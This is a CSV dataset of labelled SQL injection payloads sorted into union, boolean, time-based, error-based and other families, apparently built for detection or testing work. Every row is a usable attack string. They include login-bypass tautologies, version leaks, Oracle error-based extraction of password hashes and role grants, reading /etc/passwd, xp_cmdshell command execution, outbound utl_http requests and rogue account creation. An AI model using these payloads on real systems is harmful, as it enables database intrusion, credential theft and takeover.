source_line,family,payload
113,union," select * from users where id  =  '1' union select !<@,version  (    )   -- 1'"
114,other,declare @q nvarchar   (  200  )   select @q   =   0x770061 ...
116,boolean,select * from users where id  =  1 %!<1 or 1  =  1 -- 1
117,other,declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) 
118,boolean," select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1"
119,union," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1"
120,boolean,or 'unusual'   =   'unusual'
121,boolean, or 1 in   (  select @@version  )  --
122,other,truncate
123,other,as
124,boolean, or 3  =  3 --
125,union," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1"
126,union," select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1"
127,boolean,"admin""  )   or   (  ""1""  =  ""1"
128,union," select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1"
129,time,"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #"
130,union," select * from users where id  =  1 union select .1_,version  (    )   -- 1"
131,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i
133,boolean,select * from users where id  =  1 %$ 1 or 1  =  1 -- 1
134,boolean,select * from users where id  =  1 %!<@ or 1  =  1 -- 1
135,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --"
136,time,1  )   or sleep  (  __TIME__  )  #
137,boolean," select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1"
138,union," select * from users where id  =  1 <1## union select 1,version  (    )   -- 1"
139,union," select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1"
140,boolean,select * from users where id  =  1. <@ or 1  =  1 -- 1
141,boolean, or true--
142,other,", execute immediate 'sel' || 'ect us' || 'er'"
143,boolean,"hi' or 'x'  =  'x',"
144,boolean,select * from users where id  =  1 <@ or 1  =  1 -- 1
145,boolean," select * from users where id  =  1 or "".,"" or 1  =  1 -- 1"
146,other,admin' #
147,union," select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1"
148,boolean," select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1"
149,boolean," select * from users where id  =  1 or "",{"" or 1  =  1 -- 1"
150,union," union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;"
151,time,"""  )  ;waitfor delay '0:0:__TIME__'--"
153,other,"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   "
154,boolean,"admin"" or ""1""  =  ""1""/*"
155,boolean," select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1"
156,union," select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1"
157,other,like
158,boolean,"or username like char  (  37  )  ,"
159,time, )    )    or pg_sleep  (  __TIME__  )  --
160,boolean,select * from users where id  =  1 or $+<\ or 1  =  1 -- 1
161,boolean,or 3  =  3
162,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1"
163,boolean,select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1
164,other,exec sp
165,union," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1"
166,boolean,select * from users where id  =  1 or \<$ or 1  =  1 -- 1
167,union," select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1"
168,boolean,admin' or 1  =  1/*
169,time,a' waitfor delay '0:0:10'--
170,union," select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1"
171,union," select * from users where id  =  1 union select .1$_,version  (    )   -- 1"
172,boolean,and 1 in   (  select var from temp  )  --
173,boolean,hi'  )   or   (  'a'  =  'a
174,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i"
175,boolean,"admin"" or 1  =  1"
176,boolean,"""  )   or true--"
177,union," select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'"
178,boolean," select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1"
179,time,1  )   or pg_sleep  (  __TIME__  )  --
180,boolean," select * from users where id  =  1 or ""{."" or 1  =  1 -- 1"
181,time,"""  )   or sleep  (  __TIME__  )    =  """
182,boolean,select * from users where id  =  1.<@. or 1  =  1 -- 1
183,boolean,"admin""  )   or   (  ""1""  =  ""1""--"
184,union," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1"
185,other,", exec xp_regread"
186,union," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'"
187,boolean,select * from users where id  =  1 + \+%1 or 1  =  1 -- 1
188,boolean," select * from users where id  =  1 or "";1"" or 1  =  1 -- 1"
189,boolean," select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1"
190,boolean,1 and 1  =  1
191,boolean,or 0  =  0 #
192,union,union select * from users where login   =   char ...
193,union," select * from users where id  =  1 union select 1||@,version  (    )   -- 1"
194,boolean,admin'  )   or '1'  =  '1'--
195,other,"1,SELECT *"
196,boolean," select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1"
197,boolean,"x' and 1  =    (  select count  (  *  )   from tabname  )  , --"
198,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'"
199,boolean," select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1"
200,union," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'"
201,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #"
202,other,procedure
203,boolean,or ''  =  '
204,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i
205,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i"
206,other,"\', desc users, --"
207,union," select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1"
208,boolean,select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1'
209,other,""" or """"^"""
210,other,"""-"""
211,union," select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1"
212,union," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1"
213,union," select * from users where id  =  1 *\ union select null,@@VERSION -- 1"
214,union," select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'"
215,boolean," select * from users where id  =  1 or "".%"" or 1  =  1 -- 1"
216,other,admin'/*
217,boolean," select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1"
218,other,||UTL_HTTP.REQUEST
219,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i"
220,union," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'"
221,time,"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #"
222,union," select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1"
223,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1"
224,boolean,select * from users where id  =  '1' <@.$ or 1  =  1 -- 1'
225,union,1 uni/**/on select all from where
226,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1"
227,union," select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1"
228,boolean,admin'  )   or '1'  =  '1'#
229,other,||utl_http.request  (  'httP://192.168.1.1/'  )  ||'
230,boolean,or '7659'  =  '7659
231,boolean," select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1"
232,union," select * from users where id  =  1 union select +!<1,version  (    )   -- 1"
233,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i"
234,boolean," select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1"
236,union," select * from users where id  =  1 union select !<1,version  (    )   -- 1"
237,union," select * from users where id  =  '1' union select \#,@@VERSION -- 1'"
238,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1"
239,boolean,""" or true--"
240,boolean,select * from users where id  =  1. or 1  =  1 -- 1
241,union," select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1"
242,boolean," select * from users where id  =  1 or "";@"" or 1  =  1 -- 1"
243,boolean,â or 3  =  3 --
244,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i
245,union," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1"
246,boolean," select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1"
247,union," select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1"
248,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1"
249,boolean," select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1"
250,boolean, or uid like '%
251,boolean,select * from users where id  =  '1' <@&1 or 1  =  1 -- 1'
252,union," select * from users where id  =  '1' union select !<1,version  (    )   -- 1'"
253,boolean,"23 or 1  =  1, --"
254,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1"
255,boolean," select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1"
256,boolean," select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1"
257,boolean,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1
258,union," select * from users where id  =  '1' union select \,@@VERSION -- 1'"
259,boolean,0 or 1  =  1
260,boolean,select * from users where id  =  1 &@ or 1  =  1 -- 1
261,boolean,"admin""  )   or ""1""  =  ""1"
262,boolean,select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1
263,boolean," select * from users where id  =  1 or ""??"" or 1  =  1 -- 1"
264,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i"
265,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i"
266,other,"&apos, OR"
267,other,"sqlvuln,"
268,boolean,select * from users where id  =  1 + $+%$ or 1  =  1 -- 1
269,boolean,select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1'
270,other,""" or """"*"""
271,boolean,"hi or 1  =  1 --"""
272,union," select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1"
273,other,", exec master..xp_cmdshell 'ping 172.10.1.255'--"
274,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'"
275,union," select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'"
277,boolean,select * from users where id  =  1 or \<\. or 1  =  1 -- 1
278,other,   (  select top 1
279,boolean,Ã½ or 1  =  1 --
280,other,a' --
281,boolean, or 1  =  1 /*
282,union," select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1"
283,union," select * from users where id  =  '1' union select $ .,@@VERSION -- 1'"
284,other,--
285,other,"exec sp_addlogin 'name' , 'password'"
286,union," select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1"
287,other,0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) 
288,boolean," select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1"
289,union," select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1"
290,error,group by userid having 1  =  1--
291,union," select * from users where id  =  1 + \+%1 union select null,@@VERSION -- 1"
292,boolean,select * from users where id  =  1 *1 or 1  =  1 -- 1
293,boolean," select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1"
294,boolean,‘ or 1  =  1 --
295,union," select * from users where id  =  1 *\. union select null,@@VERSION -- 1"
296,boolean,select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1
297,boolean,or 'a'  =  'a
298,other,declare @s varchar  (  22  )   select @s   = 
299,union," select * from users where id  =  1 union select 1<@,version  (    )   -- 1"
300,union," select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1"
301,union," select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1"
302,other,@variable
303,other,", exec master..xp_cmdshell"
304,boolean,select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1
305,union," select * from users where id  =  1 union select @ 1$,version  (    )   -- 1"
306,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1"
307,union," select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1"
308,union," select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'"
310,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'"
311,boolean," select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1"
312,boolean," select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1"
313,boolean,or x  =  x
314,boolean,or a  =  a
315,boolean,or '1'  =  '1
316,union," select * from users where id  =  11<1# union select 1,version  (    )   -- 1"
317,boolean,   )    )    or    (    (   'x'   )    )     =     (    (   'x
318,union," select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'"
319,union," select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'"
320,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i"
321,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --"
322,boolean,select * from users where id  =  1 <@<@ or 1  =  1 -- 1
323,union," select * from users where id  =  1 union select @<@$,version  (    )   -- 1"
324,union," select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'"
325,boolean," select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1"
326,union," select * from users where id  =  1 or 1#""{ union select version  (    )  ,version  (    )   -- 1"
327,boolean,a' or 1  =  1--
328,boolean, )   or   (  a  =  a
329,boolean,"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x"
330,boolean," select * from users where id  =  1 or 1#""; or 1  =  1 -- 1"
331,union," select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'"
332,other,-- &password  = 
333,boolean,select * from users where id  =  1 <@. or 1  =  1 -- 1
334,boolean," select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1"
335,union," select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1"
336,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i"
338,boolean,admin' or 1  =  1
339,boolean," select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1"
340,union," select * from users where id  =  1 union select @||1,version  (    )   -- 1"
341,union," select * from users where id  =  1 +\+. union select null,@@VERSION -- 1"
342,boolean," select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1"
343,union," union select * from users where login   =   char  (  114,111,111,116  )  ;"
344,union," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1"
346,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i"
347,time,pg_sleep  (  __TIME__  )  --
348,boolean,‘ or 3  =  3 --
349,union," select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1"
350,boolean," select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1"
351,union," )   union select * from information_schema.tables,"
352,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1"
353,time,"  )   or benchmark  (  10000000,MD5  (  1   )    )   #"
354,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i
355,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i"
356,other,""" or """" """
357,other,delete
358,time,",waitfor delay '0:0:__TIME__'--"
359,boolean, or 1  =  1 --
360,boolean,1' and non_existant_table   =   '1
361,boolean," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1"
362,union," select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'"
363,other,declare @s varchar  (  200  )   select @s   =   0x77616974 ...
364,boolean,"x' AND userid IS NULL, --"
365,boolean," select * from users where id  =  1 or "";["" or 1  =  1 -- 1"
366,union," select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'"
367,union," select * from users where id  =  1 union select @<@,version  (    )   -- 1"
368,union," select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1"
369,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i
370,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i"
371,boolean,select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1
372,boolean," select * from users where id  =  1 or "".["" or 1  =  1 -- 1"
373,boolean," select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1"
374,union,UNION ALL SELECT
375,boolean," select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1"
376,boolean,select * from users where id  =  1 or \<1 or 1  =  1 -- 1
377,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1"
378,boolean,x' or full_name like '%bob%
379,boolean,"x' and members.email is NULL, --"
380,boolean, or 2 > 1
381,boolean,select * from users where id  =  1.*1 or 1  =  1 -- 1
382,time,"""  )   or pg_sleep  (  __TIME__  )  --"
383,other, '
384,union," select * from users where id  =  1 or $<\. union select 1,@@VERSION -- 1"
385,boolean," select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1"
386,boolean,select * from users where id  =  1 or \.<$ or 1  =  1 -- 1
387,time, )   or sleep  (  __TIME__  )    =  '
388,time,sleep 50'
